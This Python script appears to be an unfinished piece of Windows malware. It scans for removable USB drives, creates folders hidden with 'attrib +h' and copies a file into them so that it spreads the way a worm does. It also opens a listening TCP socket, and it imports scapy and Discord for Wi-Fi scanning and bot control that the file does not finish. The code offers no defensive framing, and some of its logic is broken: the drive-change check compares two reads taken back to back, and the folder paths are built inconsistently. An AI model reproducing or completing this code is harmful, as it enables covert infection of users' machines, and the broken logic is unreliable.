import os
import shutil
import time
import ctypes
import socket
import sys
from scapy.all import *
from threading import Thread
import pandas
import discord
from discord.ext import commands

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def create_hidden_folder(folder_name):
    folder_path = os.path.join(os.environ['USERPROFILE'], folder_name)
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)
        os.system(f'attrib +h {folder_path}')

def copy_file(file_path, folder_path):
    shutil.copy(file_path, folder_path)

def get_removable_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        if bitmask & 1:
            drive = letter + ':/'
            type = ctypes.windll.kernel32.GetDriveTypeW(ctypes.c_wchar_p(drive))
            if type == 2:
                drives.append(drive)
        bitmask >>= 1
    return drives

def main(file_path):
    file_path2 = os.getcwd() + f'\{file_path}' 
    drives = get_removable_drives()
    new_drives = get_removable_drives()
    for drive in new_drives:
        if drive not in drives:
            folder_name = drive + '.hidden_folder'
            create_hidden_folder(folder_name)
            folder_path = os.path.join(drive, folder_name)
            print(f'USB device connected: {drive}')
            copy_file(file_path2, folder_path)
            break
        
    drives = new_drives
    time.sleep(1)
def port(port):
    host = ''

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()

    print(f'Listening on {host}:{port}')

    client_socket, client_address = server_socket.accept()
    print(f'Accepted connection from {client_address[0]}:{client_address[1]}')

    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        print(f'Received message: {data.decode()}')

    client_socket.close()
    server_socket.close()

#NOTE find all component
